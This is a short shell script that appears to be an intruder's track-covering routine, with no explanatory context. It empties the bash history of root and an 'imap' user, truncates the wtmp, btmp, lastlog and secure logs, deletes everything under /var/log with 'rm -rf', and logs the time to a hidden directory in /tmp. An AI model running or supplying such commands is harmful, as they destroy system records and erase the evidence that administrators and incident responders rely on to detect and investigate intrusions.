logfile=/tmp/.nttest/log.txt
echo > /root/.bash_history
echo > /home/imap/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
rm -rf /var/log/*
date >> $logfile
